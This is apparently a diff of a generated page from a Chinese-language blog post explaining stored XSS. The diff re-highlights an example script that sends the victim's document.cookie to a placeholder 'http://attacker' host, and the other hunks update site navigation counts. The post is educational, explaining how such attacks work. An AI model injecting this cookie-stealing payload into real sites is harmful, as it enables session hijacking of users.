@@ -386,7 +386,7 @@
 <li>攻击者是一位打算利用网站XSS漏洞向受害者发动攻击的恶意用户</li>
 <li>攻击者服务器是由攻击者控制服务器，专用于窃取受害者的敏感信息。在我们的例子中，它的地址是：<a href="http://attacker" target="_blank" rel="external">http://attacker</a></li>
 </ul>
-<h2 id="一个攻击场景示例"><a href="#一个攻击场景示例" class="headerlink" title="一个攻击场景示例"></a>一个攻击场景示例</h2><p>在这个例子中，我们假设攻击者的终极目标是利用网站的XSS漏洞窃取受害者的cookie。这可以通过设法让受害者的浏览器解析下面HTML代码来实现：<br><figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line">window.location='http://attacker/?cookie='+document.cookie</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<h2 id="一个攻击场景示例"><a href="#一个攻击场景示例" class="headerlink" title="一个攻击场景示例"></a>一个攻击场景示例</h2><p>在这个例子中，我们假设攻击者的终极目标是利用网站的XSS漏洞窃取受害者的cookie。这可以通过设法让受害者的浏览器解析下面HTML代码来实现：<br><figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line"><span class="built_in">window</span>.location=<span class="string">'http://attacker/?cookie='</span>+<span class="built_in">document</span>.cookie</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
 <p>这段脚本将用户的浏览器定向到一个完全不同的URL，也就是触发向攻击者的服务器发送一次HTTP请求。这串URL把受害者的cookie作为查询参数，当攻击者服务器收到该请求后就能从中把cookie提取出来。一旦攻击者获取到cookie，他就能借助cookie扮演受害者并且发动更多的攻击。</p>
 <p>从现在起，上面的HTML就被认为是<strong>恶意文本</strong>或者是<strong>恶意脚本</strong>。非常值得注意的重要一点是，恶意代码只有在受害者的浏览器中最终得到解析之后才算得上是恶意，这只可能发生有XSS缺陷的站点上。</p>
 <h2 id="攻击是如何工作的"><a href="#攻击是如何工作的" class="headerlink" title="攻击是如何工作的"></a>攻击是如何工作的</h2><p>下面的图示展现了上面的例子中攻击者发动的攻击是如何运作的<br><img src="/2017/05/04/XSS/1.png" alt="1.png" title=""><br>1、攻击者利用提交网站表单将一段恶意文本插入网站的数据库中<br>2、受害者向网站请求页面<br>3、网站从数据库中取出恶意文本把它包含进返回给受害者的页面中<br>4、受害者的浏览器执行返回页面中的恶意脚本，把自己的cookie发送给攻击者的服务器。</p>
@@ -614,6 +614,10 @@
 
           <div class="post-nav-prev post-nav-item">
             
+              <a href="/2017/05/31/React组件写法/" rel="prev" title="React组件写法">
+                React组件写法 <i class="fa fa-chevron-right"></i>
+              </a>
+            
           </div>
         </div>
       
@@ -703,7 +707,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">40</span>
+              <span class="site-state-item-count">41</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -711,7 +715,7 @@
           
             <div class="site-state-item site-state-categories">
               <a href="/categories">
-                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-count">12</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -720,7 +724,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">36</span>
+                <span class="site-state-item-count">37</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
